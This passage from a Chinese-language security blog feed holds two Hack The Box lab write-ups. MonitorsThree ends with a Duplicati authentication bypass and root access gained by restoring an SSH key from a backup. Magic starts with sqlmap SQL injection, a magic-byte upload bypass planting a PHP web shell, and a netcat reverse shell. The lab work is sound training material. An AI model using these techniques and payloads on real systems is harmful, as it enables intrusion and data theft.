&lt;/h3&gt;&lt;p&gt;打开浏览器访问 &lt;a href=&#34;http://localhost:8200&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;http://localhost:8200&lt;/a&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;965&#34; height=&#34;528&#34; src=&#34;../wp-contnt/uploads/2024/08/1724830749-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-252&#34; srcset=&#34;../legacy/uploads/2024/08/1724830749-image.png 965w, ../legacy/uploads/2024/08/1724830749-image-300x164.png 300w, ../legacy/uploads/2024/08/1724830749-image-768x420.png 768w&#34; sizes=&#34;auto, (max-width: 965px) 100vw, 965px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p class=&#34;has-text-align-center&#34;&gt;
  &lt;em&gt;Duplicati 是一个开源的、跨平台的备份解决方案，主要用于加密、备份和恢复文件。它通过 Web 界面进行管理和配置，使得用户能够轻松地在各种存储目标之间创建和管理备份任务。Duplicati 支持多种操作系统，包括 Windows、macOS 和 Linux。&lt;/em&gt;
&lt;/p&gt;
&lt;p&gt;搜索duplicati exploit找到了这个文章 &lt;a href=&#34;https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee&lt;/a&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;了解到duplicati的login.js暴露了加密方法：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;338&#34; src=&#34;../wp-contnt/uploads/2024/08/1724831923-image-1024x338.png&#34; alt=&#34;&#34; class=&#34;wp-image-262&#34; srcset=&#34;../legacy/uploads/2024/08/1724831923-image-1024x338.png 1024w, ../legacy/uploads/2024/08/1724831923-image-300x99.png 300w, ../legacy/uploads/2024/08/1724831923-image-768x253.png 768w, ../legacy/uploads/2024/08/1724831923-image.png 1458w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用文中方法，把得到的passphrase进行转换。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;592&#34; src=&#34;../wp-contnt/uploads/2024/08/1724832070-image-1024x592.png&#34; alt=&#34;&#34; class=&#34;wp-image-263&#34; srcset=&#34;../legacy/uploads/2024/08/1724832070-image-1024x592.png 1024w, ../legacy/uploads/2024/08/1724832070-image-300x173.png 300w, ../legacy/uploads/2024/08/1724832070-image-768x444.png 768w, ../legacy/uploads/2024/08/1724832070-image-1536x887.png 1536w, ../legacy/uploads/2024/08/1724832070-image.png 2044w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在firfox中打开inspect-&amp;gt;console&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-javascript&#34;&gt;&lt;code&gt;allow pasting 

var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(&#34;r4SX7ebpyPo4mlDvMkJOucJTfHQhXftKP2VVShRHlY=&#34;) + &#34;59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a&#34;)).toString(CryptoJS.enc.Base64);

noncedpwd
&#34;UvrZnpXsxYhieUFAF2H+X6hmFRtIcN9hHGTCWaR2smU=&#34;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;并在burpsuite中把拦截到的请求data： password替换成生成的值。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;574&#34; src=&#34;../wp-contnt/uploads/2024/08/1724832721-image-1024x574.png&#34; alt=&#34;&#34; class=&#34;wp-image-265&#34; srcset=&#34;../legacy/uploads/2024/08/1724832721-image-1024x574.png 1024w, ../legacy/uploads/2024/08/1724832721-image-300x168.png 300w, ../legacy/uploads/2024/08/1724832721-image-768x431.png 768w, ../legacy/uploads/2024/08/1724832721-image-1536x861.png 1536w, ../legacy/uploads/2024/08/1724832721-image.png 1864w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;登录成功。摸索一番后，了解到这个应用可以备份文件，还可以把备份文件还原到指定目录。&lt;/p&gt;
&lt;p&gt;我们可以在本地生成一个ssh key并把公钥传递到靶机上。通过备份把authorized_keys放到root根目录下的.ssh文件里，就可以通过密钥访问root。先在本地生成ssh key，并把authorized_keys传递到靶机&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;# kali linux
ssh-keygen -t rsa -b 4096 -f monitor
scp -i id_rsa monitor.pub marcus@10.10.11.30:/home/marcus/authorized_keys&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;新建一个备份任务：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;531&#34; src=&#34;../wp-contnt/uploads/2024/08/1724832964-image-1024x531.png&#34; alt=&#34;&#34; class=&#34;wp-image-268&#34; srcset=&#34;../legacy/uploads/2024/08/1724832964-image-1024x531.png 1024w, ../legacy/uploads/2024/08/1724832964-image-300x156.png 300w, ../legacy/uploads/2024/08/1724832964-image-768x399.png 768w, ../legacy/uploads/2024/08/1724832964-image-1536x797.png 1536w, ../legacy/uploads/2024/08/1724832964-image.png 1684w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;459&#34; src=&#34;../wp-contnt/uploads/2024/08/1724833998-image-1024x459.png&#34; alt=&#34;&#34; class=&#34;wp-image-271&#34; srcset=&#34;../legacy/uploads/2024/08/1724833998-image-1024x459.png 1024w, ../legacy/uploads/2024/08/1724833998-image-300x135.png 300w, ../legacy/uploads/2024/08/1724833998-image-768x344.png 768w, ../legacy/uploads/2024/08/1724833998-image-1536x689.png 1536w, ../legacy/uploads/2024/08/1724833998-image.png 1701w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;关闭自动备份&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;565&#34; src=&#34;../wp-contnt/uploads/2024/08/1724834038-image-1024x565.png&#34; alt=&#34;&#34; class=&#34;wp-image-272&#34; srcset=&#34;../legacy/uploads/2024/08/1724834038-image-1024x565.png 1024w, ../legacy/uploads/2024/08/1724834038-image-300x165.png 300w, ../legacy/uploads/2024/08/1724834038-image-768x424.png 768w, ../legacy/uploads/2024/08/1724834038-image-1536x847.png 1536w, ../legacy/uploads/2024/08/1724834038-image.png 1677w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;运行后，选择直接从备份还原&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;478&#34; src=&#34;../wp-contnt/uploads/2024/08/1724834076-image-1024x478.png&#34; alt=&#34;&#34; class=&#34;wp-image-273&#34; srcset=&#34;../legacy/uploads/2024/08/1724834076-image-1024x478.png 1024w, ../legacy/uploads/2024/08/1724834076-image-300x140.png 300w, ../legacy/uploads/2024/08/1724834076-image-768x359.png 768w, ../legacy/uploads/2024/08/1724834076-image-1536x718.png 1536w, ../legacy/uploads/2024/08/1724834076-image.png 1888w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;553&#34; src=&#34;../wp-contnt/uploads/2024/08/1724834247-image-1024x553.png&#34; alt=&#34;&#34; class=&#34;wp-image-275&#34; srcset=&#34;../legacy/uploads/2024/08/1724834247-image-1024x553.png 1024w, ../legacy/uploads/2024/08/1724834247-image-300x162.png 300w, ../legacy/uploads/2024/08/1724834247-image-768x414.png 768w, ../legacy/uploads/2024/08/1724834247-image-1536x829.png 1536w, ../legacy/uploads/2024/08/1724834247-image.png 1768w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;还原到root的.ssh文件下&lt;/p&gt;
&lt;p&gt;显示成功后用密钥连接&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;➜  Monitor ssh -i monitor root@cacti.monitorsthree.htb                  
Last login: Tue Aug 20 15:21:21 2024
root@monitorsthree:~# ls
root.txt  scripts
root@monitorsthree:~# id
uid=0(root) gid=0(root) groups=0(root)
root@monitorsthree:~#&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;BOOM. Rooted.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Happy Hacking.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HTB-Retired-Magic-Writeup</title>
        <link>http://localhost:1313/htb-retired-magic-Writeup/</link>
        <pubDate>Thu, 29 Aug 2024 05:31:35 +0000</pubDate>
        
        <guid>http://localhost:1313/htb-retired-magic-Writeup/</guid>
        <description>&lt;img src="http://localhost:1313/legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp" alt="Featured image of post HTB-Retired-Magic-Writeup" /&gt;&lt;div class=&#34;wp-block-image&#34;&gt;
  &lt;figure class=&#34;aligncenter size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;300&#34; height=&#34;300&#34; src=&#34;../legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479.webp&#34; alt=&#34;&#34; class=&#34;wp-image-380&#34; srcset=&#34;../legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479.webp 300w, ../legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp 150w&#34; sizes=&#34;auto, (max-width: 300px) 100vw, 300px&#34; /&gt;&lt;/figure&gt;
&lt;/div&gt;
&lt;p&gt;Medium难度，直接扫端口。&lt;/p&gt;
&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code&gt;PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;port-80-wp-block-heading&#34;&gt;Port 80 {.wp-block-heading}&lt;figure class=&#34;wp-block-image size-large&#34;&gt;
&lt;/h2&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;499&#34; src=&#34;../legacy/uploads/2024/08/1724907496-image-1024x499.png&#34; alt=&#34;&#34; class=&#34;wp-image-383&#34; srcset=&#34;../legacy/uploads/2024/08/1724907496-image-1024x499.png 1024w, ../legacy/uploads/2024/08/1724907496-image-300x146.png 300w, ../legacy/uploads/2024/08/1724907496-image-768x374.png 768w, ../legacy/uploads/2024/08/1724907496-image-1536x748.png 1536w, ../legacy/uploads/2024/08/1724907496-image.png 1873w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;一个图片展示网站。左下角显示可以login可以登录。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://10.10.10.185/login.php&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;http://10.10.10.185/login.php&lt;/a&gt; （服务器运行php）&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;606&#34; height=&#34;252&#34; src=&#34;../legacy/uploads/2024/08/1724907542-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-386&#34; srcset=&#34;../legacy/uploads/2024/08/1724907542-image.png 606w, ../legacy/uploads/2024/08/1724907542-image-300x125.png 300w&#34; sizes=&#34;auto, (max-width: 606px) 100vw, 606px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;弱口令失败，magic，root，admin。随机输入错误用户名密码时会显示&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;818&#34; height=&#34;318&#34; src=&#34;../legacy/uploads/2024/08/1724907567-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-388&#34; srcset=&#34;../legacy/uploads/2024/08/1724907567-image.png 818w, ../legacy/uploads/2024/08/1724907567-image-300x117.png 300w, ../legacy/uploads/2024/08/1724907567-image-768x299.png 768w&#34; sizes=&#34;auto, (max-width: 818px) 100vw, 818px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;试试SQLi &lt;strong&gt;&lt;em&gt;1&amp;rsquo;or&#39;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;&amp;ndash;&lt;/em&gt;&lt;/strong&gt; 没有跳出错误用户名与密码，但也没有登录。有点可疑。用户名里不能输入空格，打开burpsuite在里面加入空格并html encode试试&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;741&#34; height=&#34;473&#34; src=&#34;../legacy/uploads/2024/08/1724907616-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-390&#34; srcset=&#34;../legacy/uploads/2024/08/1724907616-image.png 741w, ../legacy/uploads/2024/08/1724907616-image-300x191.png 300w&#34; sizes=&#34;auto, (max-width: 741px) 100vw, 741px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;依然没有跳出“wrong Username or Password”。但等于页面确实会对字符“ ’ ” 有不同的回应。用sqlmap试试。&lt;/p&gt;
&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code&gt;sqlmap -r req --batch -dbs --level=3 --risk=3&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&#34;wp-block-image size-large&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;547&#34; src=&#34;../legacy/uploads/2024/08/1724907744-image-1024x547.png&#34; alt=&#34;&#34; class=&#34;wp-image-396&#34; srcset=&#34;../legacy/uploads/2024/08/1724907744-image-1024x547.png 1024w, ../legacy/uploads/2024/08/1724907744-image-300x160.png 300w, ../legacy/uploads/2024/08/1724907744-image-768x410.png 768w, ../legacy/uploads/2024/08/1724907744-image-1536x821.png 1536w, ../legacy/uploads/2024/08/1724907744-image.png 1538w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;有sql注入漏洞，且提取到了两个数据库。提取Magic看看有什么。&lt;/p&gt;
&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code&gt;sqlmap -r req --batch -dbs --level=3 --risk=3 -D Magic --tables&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;690&#34; height=&#34;226&#34; src=&#34;../legacy/uploads/2024/08/1724907803-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-399&#34; srcset=&#34;../legacy/uploads/2024/08/1724907803-image.png 690w, ../legacy/uploads/2024/08/1724907803-image-300x98.png 300w&#34; sizes=&#34;auto, (max-width: 690px) 100vw, 690px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;dump数据&lt;/p&gt;
&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code&gt;sqlmap -r req --batch -dbs --level=3 --risk=3 -D Magic -T login --dump

Database: Magic
Table: login
&amp;#91;1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | Th3s3usW4sK1ng | admin    |
+----+----------------+----------+&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ok，得到admin密码，试试在页面登录。登录成功：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://10.10.10.185/upload.php&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;http://10.10.10.185/upload.php&lt;/a&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;643&#34; height=&#34;522&#34; src=&#34;../legacy/uploads/2024/08/1724907844-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-401&#34; srcset=&#34;../legacy/uploads/2024/08/1724907844-image.png 643w, ../legacy/uploads/2024/08/1724907844-image-300x244.png 300w&#34; sizes=&#34;auto, (max-width: 643px) 100vw, 643px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;rce&#34;&gt;RCE
&lt;/h2&gt;&lt;p&gt;可以上传图片，已知服务器运行的有php，上传个php文件试试。&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;802&#34; height=&#34;233&#34; src=&#34;../legacy/uploads/2024/08/1724907857-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-402&#34; srcset=&#34;../legacy/uploads/2024/08/1724907857-image.png 802w, ../legacy/uploads/2024/08/1724907857-image-300x87.png 300w, ../legacy/uploads/2024/08/1724907857-image-768x223.png 768w&#34; sizes=&#34;auto, (max-width: 802px) 100vw, 802px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;上传个test.php.jpg呢？php会识别.php.jpg文件后缀并当成php文件执行&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;792&#34; height=&#34;285&#34; src=&#34;../legacy/uploads/2024/08/1724907867-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-403&#34; srcset=&#34;../legacy/uploads/2024/08/1724907867-image.png 792w, ../legacy/uploads/2024/08/1724907867-image-300x108.png 300w, ../legacy/uploads/2024/08/1724907867-image-768x276.png 768w&#34; sizes=&#34;auto, (max-width: 792px) 100vw, 792px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;哈哈，被抓到了。试试把php内容放到jpg里呢？&lt;/p&gt;
&lt;p&gt;机器的名字像是给了个提示，试试改变文件的magic bytes&lt;/p&gt;
&lt;p&gt;通过wiki&lt;a href=&#34;https://en.wikipedia.org/wiki/List_of_file_signatures&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/List_of_file_signatures&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://en.wikipedia.org/wiki/List_of_file_signatures&lt;/a&gt;&lt;/a&gt;查到jpg的magicbytes是 FF D8 FF E0&lt;/p&gt;
&lt;p&gt;打开hexedit 修改后上传&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;44&#34; src=&#34;../legacy/uploads/2024/08/1724908026-image-1024x44.png&#34; alt=&#34;&#34; class=&#34;wp-image-408&#34; srcset=&#34;../legacy/uploads/2024/08/1724908026-image-1024x44.png 1024w, ../legacy/uploads/2024/08/1724908026-image-300x13.png 300w, ../legacy/uploads/2024/08/1724908026-image-768x33.png 768w, ../legacy/uploads/2024/08/1724908026-image-1536x65.png 1536w, ../legacy/uploads/2024/08/1724908026-image.png 1713w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;334&#34; height=&#34;81&#34; src=&#34;../legacy/uploads/2024/08/1724908045-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-410&#34; srcset=&#34;../legacy/uploads/2024/08/1724908045-image.png 334w, ../legacy/uploads/2024/08/1724908045-image-300x73.png 300w&#34; sizes=&#34;auto, (max-width: 334px) 100vw, 334px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功了！刷新看看&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;730&#34; height=&#34;375&#34; src=&#34;../legacy/uploads/2024/08/1724908058-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-412&#34; srcset=&#34;../legacy/uploads/2024/08/1724908058-image.png 730w, ../legacy/uploads/2024/08/1724908058-image-300x154.png 300w&#34; sizes=&#34;auto, (max-width: 730px) 100vw, 730px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;右键打开新标签查看&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;54&#34; src=&#34;../legacy/uploads/2024/08/1724908071-image-1024x54.png&#34; alt=&#34;&#34; class=&#34;wp-image-414&#34; srcset=&#34;../legacy/uploads/2024/08/1724908071-image-1024x54.png 1024w, ../legacy/uploads/2024/08/1724908071-image-300x16.png 300w, ../legacy/uploads/2024/08/1724908071-image-768x40.png 768w, ../legacy/uploads/2024/08/1724908071-image.png 1314w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;显示jpg错误。一番操作后，发现了服务器会识别文件名后缀和文件的magic bytes，不会匹配content-type。&lt;/p&gt;
&lt;p&gt;突发奇想，会不会是服务器先查看文件后缀是否匹配，然后再查看文件magic bytes呢？如果把后缀.php.jpg和修改magic bytes组合起来呢？&lt;/p&gt;
&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code&gt;vim test.php.jpg &gt;

&amp;lt;?php echo system($_GET&amp;#91;&#39;cmd&#39;]); ?&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后hexedit修改magic bytes&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;66&#34; src=&#34;../legacy/uploads/2024/08/1724908130-image-1024x66.png&#34; alt=&#34;&#34; class=&#34;wp-image-419&#34; srcset=&#34;../legacy/uploads/2024/08/1724908130-image-1024x66.png 1024w, ../legacy/uploads/2024/08/1724908130-image-300x19.png 300w, ../legacy/uploads/2024/08/1724908130-image-768x50.png 768w, ../legacy/uploads/2024/08/1724908130-image-1536x99.png 1536w, ../legacy/uploads/2024/08/1724908130-image.png 1719w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;上传并打开：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;422&#34; height=&#34;69&#34; src=&#34;../legacy/uploads/2024/08/1724908138-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-421&#34; srcset=&#34;../legacy/uploads/2024/08/1724908138-image.png 422w, ../legacy/uploads/2024/08/1724908138-image-300x49.png 300w&#34; sizes=&#34;auto, (max-width: 422px) 100vw, 422px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;114&#34; src=&#34;../legacy/uploads/2024/08/1724908152-image-1024x114.png&#34; alt=&#34;&#34; class=&#34;wp-image-422&#34; srcset=&#34;../legacy/uploads/2024/08/1724908152-image-1024x114.png 1024w, ../legacy/uploads/2024/08/1724908152-image-300x33.png 300w, ../legacy/uploads/2024/08/1724908152-image-768x85.png 768w, ../legacy/uploads/2024/08/1724908152-image-1536x171.png 1536w, ../legacy/uploads/2024/08/1724908152-image.png 1753w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;rce成功。用&lt;a href=&#34;https://www.revshells.com/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.revshells.com/&lt;/a&gt;&lt;/a&gt; 网站生成一个pentest monkey的 php revshell上传&lt;/p&gt;
&lt;p&gt;打开netcat监听&lt;/p&gt;
&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code&gt;magic nc -nlvp 4444               
listening on &amp;#91;any] 4444 ...
connect to &amp;#91;10.10.14.13] from (UNKNOWN) &amp;#91;10.10.10.185] 45358
Linux magic 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 21:08:11 up  2:18,  0 users,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1199): Inappropriate ioctl for device
bash: no job control in this shell
www-data@magic:/$&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;拿到revshell&lt;/p&gt;
&lt;h2 id=&#34;lateral-movement&#34;&gt;Lateral Movement
&lt;/h2&gt;&lt;p&gt;先升级下shell&lt;/p&gt;
&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code&gt;python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看看有什么用户&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
